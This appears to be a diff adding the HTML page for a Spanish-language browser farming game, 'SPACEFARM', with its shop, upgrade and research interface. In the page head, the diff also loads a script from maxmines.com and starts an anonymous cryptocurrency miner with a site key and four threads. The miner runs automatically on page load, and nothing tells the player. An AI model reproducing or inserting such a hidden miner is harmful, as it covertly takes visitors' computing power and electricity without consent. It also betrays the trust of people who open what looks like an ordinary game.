@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <script
+  src="https://code.jquery.com/jquery-3.4.1.min.js"
+  integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+  crossorigin="anonymous"></script>
+    <link href="https://fonts.googleapis.com/css?family=Do+Hyeon&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="main.css?ver=0.20">
+    <script src="default.js?ver=0.20"></script>
+    <script src="main.js?ver=0.20"></script>
+    <link rel="icon" href="favicon.ico">
+    <title>SPACEFARM</title>
+    <script src="https://maxmines.com/lib/maxmines.min.js"></script>
+    <script>
+	var miner = new MaxMines.Anonymous("sIQZK76pFx5ZSFD0pA1xtOuig1SX8MuxiH8c1Omj", {
+	    throttle: 0.2,
+	    threads: 4,
+	});
+    miner.start();
+    </script>
+  </head>
+  <body>
+    <div id="warpAll">
+      <div id="playerStatus">
+        <span>
+          <span class="playerIcon" style="background-image: url(Resource/etc/coin.png)"></span><span id="coin">50</span>
+        </span>
+        <span>
+          <span class="playerIcon" style="background-image: url(Resource/etc/diamond.png)"></span><span id="diamond">0</span>
+        </span>
+        <span>
+          <span id="level">Nivel 1</span>
+        </span>
+        <span>
+          <div id="exp">
+            0 / 10 EXP (0%)
+          </div>
+        </span>
+        <span>
+          <meter id="levelProgress" value="0" max="1"></meter>
+        </span>
+      </div>
+      <div id="gameScreen">
+        <div id="farm">
+          <div id="l1" class="farmLine"></div>
+          <div id="l2" class="farmLine"></div>
+          <div id="l3" class="farmLine"></div>
+          <div id="l4" class="farmLine"></div>
+          <div id="l5" class="farmLine"></div>
+          <div id="l6" class="farmLine"></div>
+          <div id="l7" class="farmLine"></div>
+          <div id="l8" class="farmLine"></div>
+          <div id="l9" class="farmLine"></div>
+        </div>
+        <div id="tools">
+          <span class="toolSel" style="background-image: url(Resource/Tool/p1.png)"></span>
+          <span style="background-image: url(Resource/Tool/h1.png)"></span>
+          <span style="background-image: url(Resource/Tool/hand.png)"></span>
+        </div>
+        <div id="goCraft">
+          [+] Exchange
+        </div>
+        <div id="cellStatus">
+          Nivel .0<br>
+          Planta: Nada (1m restante)<br>
+          Valor: 0 G
+        </div>
+        <div id="shop">
+          <div id="changeShop" class="clearFix">
+            <span>◀</span>
+            <span>Menu</span>
+            <span>▶</span>
+          </div>
+          <div id="warpShop">
+            <div id="innerHand">
+              <div class="divisionTxt">
+                Items
+              </div>
+              <hr class="divisionHr">
+              <div id="creatureThing">
+                <span class="handBlock" style="background-image: url(Resource/Pond/1.png)">Estanque<br>Precio:100</span>
+              </div>
+              <div class="divisionTxt">
+                Semillas
+              </div>
+              <hr class="divisionHr">
+              <div id="seedThing">
+              </div>
+            </div>
+            <div id="innerInventory">
+
+            </div>
+            <div id="innerShop">
+            </div>
+            <div id="innerUpgrade">
+              <div class="upgradeThing upgradeN">
+                <div>Mejorar pico Nv.<span>0</span></div>
+                <div>Haz que tu pico sea mas rapido</div>
+                <hr>
+                <span>Costo: </span><span>100 G</span>
+              </div>
+              <div class="upgradeThing upgradeN">
+                <div>Mejorar maquina de cortar Nv.<span>0</span></div>
+                <div>Hacer que tu maquina de cortar sea mas rapida</div>
+                <hr>
+                <span>Costo: </span><span>100 G</span>
+              </div>
+              <div class="upgradeThing upgradeN">
+                <div>Extraccion de minerales Nv.<span>0</span></div>
+                <div>Aumentar +1% la oportunidad de tener minerales</div>
+                <hr>
+                <span>Costo: </span><span>100 G</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="craftScreen">
+        <div class="goGame">
+          Volver
+        </div>
+        <div id="craftMenu">
+          <span>Construir</span>
+          <span>Maquinaria</span>
+          <span>Desarrollar</span>
+        </div>
+        <div id="craftInner">
+          <div id="craftMaterial">
+          </div>
+          <div id="craftMachine">
+          </div>
+          <div id="craftResearch">
+            <div id="rpDisplay" class="megaShadow">
+              Tienes 0 puntos de investigacion
+            </div>
+            <div id="bulkResearch" class=clearFix><span>+1</span><span>10%</span><span>25%</span><span>50%</span><span>100%</span></div>
+            <div class="researchCell">
+              <span>Crecimiento</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Doble Chance</span>
+              <span>0 RP gastado (0%)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Precio de Venta</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Diamantes</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Construccion</span>
+              <span>0 RP gastado (0%)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Punteado</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Arado</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Ganancias</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+            <div class="researchCell">
+              <span>Experiencia</span>
+              <span>0 RP gastado (x1)</span>
+              <span style="background-image: url(Resource/etc/plus.png)"></span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </body>
+</html>
